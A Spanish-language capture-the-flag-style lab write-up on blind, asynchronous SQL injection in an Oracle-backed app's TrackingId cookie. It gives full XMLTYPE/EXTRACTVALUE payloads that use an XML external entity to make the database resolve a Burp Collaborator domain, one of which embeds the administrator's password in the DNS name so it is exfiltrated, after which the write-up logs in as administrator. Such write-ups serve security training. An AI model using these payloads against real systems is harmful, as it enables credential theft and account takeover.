# 💉 Inyección SQL ciega con exfiltración de datos por canal OOB

## 📄 Descripción del laboratorio

Este laboratorio contiene una **inyección SQL ciega con ejecución asíncrona**.\
La aplicación utiliza una cookie llamada `TrackingId` para realizar análisis internos, y su valor se inserta directamente en una consulta SQL.

En este escenario:

* La consulta SQL **no afecta a la respuesta HTTP**.
* **No aparecen errores visibles**.
* **No existen diferencias de tiempo**.
* Es posible provocar **interacciones fuera de banda (Out-of-Band, OOB)**.

La base de datos contiene una tabla:

```
users(username, password)
```

El objetivo es aprovechar la vulnerabilidad para **extraer la contraseña del usuario `administrator`** utilizando un canal OOB y posteriormente autenticarnos en su cuenta.



## 📚 Teoría

### 📌 Exfiltración de datos mediante canal Out-of-Band

Este laboratorio amplía el escenario del laboratorio anterior.

Antes solo confirmábamos la vulnerabilidad mediante una interacción externa.\
Ahora utilizaremos ese mismo canal para **exfiltrar datos reales**.

El problema de partida es extremadamente restrictivo:

* La consulta SQL se ejecuta **de forma asíncrona**.
* No hay errores visibles.
* No hay datos reflejados.
* No hay retrasos medibles.

Esto significa que **no existe ningún canal de retroalimentación dentro de la aplicación**.

La única opción viable es utilizar **interacciones externas**.

### 📌 Canal DNS para exfiltración

Si conseguimos que la base de datos intente resolver un dominio que controlamos, podremos observar esa interacción desde nuestro servidor.

La técnica consiste en:

1. Ejecutar una subconsulta SQL que obtenga un dato sensible.
2. Concatenar ese dato dentro de un nombre de dominio.
3. Forzar al servidor a resolver ese dominio.

El valor sensible viajará dentro de la consulta DNS.

### 📌 Uso de XML externo en Oracle

En Oracle, esto puede realizarse combinando:

```
XMLTYPE
EXTRACTVALUE
```

junto con **entidades externas XML**.

Esto permite provocar resoluciones DNS hacia dominios controlados por el atacante.

**Burp Collaborator** actúa como el receptor de esas consultas.



## 📝 Práctica

### 1️⃣ Verificar que solo OOB es viable

Analizando el comportamiento de la aplicación:

* SQL Injection clásica → no hay datos reflejados.
* SQLi basada en errores → no aparecen errores.
* SQLi basada en tiempo → ejecución asíncrona.
* SQLi basada en condiciones → la respuesta no cambia.

Conclusión: **la única vía viable es un canal OOB**.



### 2️⃣ Preparar Burp Collaborator

Abrimos **Burp Collaborator** y generamos un subdominio único, por ejemplo:

```
abcdef1234.oastify.com
```

Este dominio se utilizará para detectar interacciones DNS.



### 3️⃣ Confirmar interacción OOB básica

Primero confirmamos que el servidor puede realizar resoluciones DNS salientes.

Payload base:

```
' UNION SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://abcdef1234.oastify.com/">
    %remote;
  ]>'),
'/l')
FROM dual-- -
```

Antes de enviarlo es necesario **URL-encodear completamente el payload**.

Lo insertamos en la cookie:

```
TrackingId
```

Enviamos la petición.

Resultado:

* La página carga normalmente.
* No hay cambios visibles.

Vamos a **Burp Collaborator** y pulsamos **Poll now**.

Aparece una interacción DNS hacia:

```
abcdef1234.oastify.com
```

Esto confirma que la **SQL Injection OOB funciona**.

### 4️⃣ Exfiltrar la contraseña por DNS

Ahora concatenamos la contraseña dentro del dominio que se resolverá.

Payload base (sin codificar):

```
' UNION SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://'|| 
      (SELECT password FROM users WHERE username='administrator') 
    ||'.abcdef1234.oastify.com/">
    %remote;
  ]>'),
'/l')
FROM dual-- -
```

Funcionamiento del payload:

1. Se ejecuta una subconsulta que obtiene la contraseña.
2. El valor se concatena dentro del nombre de dominio.
3. Oracle intenta resolver ese dominio.

El dominio resultante tendrá la forma:

```
contraseña.abcdef1234.oastify.com
```

El payload debe **URL-encodearse completamente** antes de enviarlo.



### 5️⃣ Recuperar la contraseña

Enviamos la petición con el payload codificado.

Volvemos a **Burp Collaborator** y pulsamos **Poll now**.

Aparecen interacciones DNS similares a:

```
j4k3r0ck5!.abcdef1234.oastify.com
```

La primera parte del dominio corresponde a la **contraseña del usuario administrator**.

### 6️⃣ Iniciar sesión como administrator

Accedemos al formulario de login de la aplicación e introducimos:

```
Username: administrator
Password: contraseña obtenida
```

La autenticación se realiza correctamente.

El laboratorio detecta el login exitoso y se marca como completado.

### 7️⃣ Resultado

Mediante una **SQL Injection ciega con exfiltración Out-of-Band** se ha conseguido:

* Confirmar la vulnerabilidad en la cookie `TrackingId`.
* Provocar resoluciones DNS desde el servidor vulnerable.
* Exfiltrar la contraseña del usuario **administrator**.
* Autenticarse con éxito en la aplicación.

✅ El laboratorio queda resuelto.
